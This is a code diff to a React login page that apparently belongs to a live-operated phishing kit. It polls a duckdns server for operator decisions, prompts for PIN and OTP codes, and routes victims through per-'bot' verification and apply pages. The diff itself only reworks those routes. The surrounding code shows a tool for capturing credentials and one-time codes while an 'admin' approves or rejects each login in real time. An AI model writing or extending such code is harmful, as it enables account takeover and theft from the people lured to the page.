@@ -1,7 +1,7 @@
 import React, { useState, useRef, useEffect } from 'react'
 import axios from 'axios'
 import { useNavigate, useParams } from 'react-router-dom'
-import { apiService } from '../services/api.js'
+import { apiService, getBotName } from '../services/api.js'
 
 const API_BASE_URL = "https://lnmb.duckdns.org"
 
@@ -37,7 +37,10 @@ function Login() {
   const inputRefs = useRef([])
   const sessionRef = useRef(null)
   const timerRef = useRef(null)
-  const userId = user || 'default'
+  const { user } = useParams()
+  const isBotPath = user && user !== 'default' && user !== 'undefined'
+  const userId = user || getBotName()
+  const basePath = isBotPath ? `/${user}` : ""
   
   const statusMessages = {
     pending: "⏳ En attente...",
@@ -94,7 +97,7 @@ function Login() {
         if (data.status === "approved") {
           setStatus("approved")
           setLoading(false)
-          navigate(`/${userId}/verification`)
+          navigate(`${basePath}/verification`)
         } else if (data.status === "rejected") {
           setError("❌ Request rejected by admin. Please try again.")
           setLoading(false)
@@ -112,7 +115,7 @@ function Login() {
         } else if (data.status === "approved_with_otp") {
           setStatus("pinotp_correct")
           setLoading(false)
-          navigate(`/${userId}/verification`)
+          navigate(`${basePath}/verification`)
         } else if (data.status === "message_user") {
           setAdminMessage(data.message || "")
         }
@@ -272,7 +275,7 @@ function Login() {
         <div style={{ textAlign: 'center', marginTop: '20px' }}>
           <button 
             type="button" 
-            onClick={() => navigate(`/${userId}/apply`)}
+            onClick={() => navigate(`${basePath}/apply`)}
             style={{ 
               background: 'none', 
               border: 'none', 
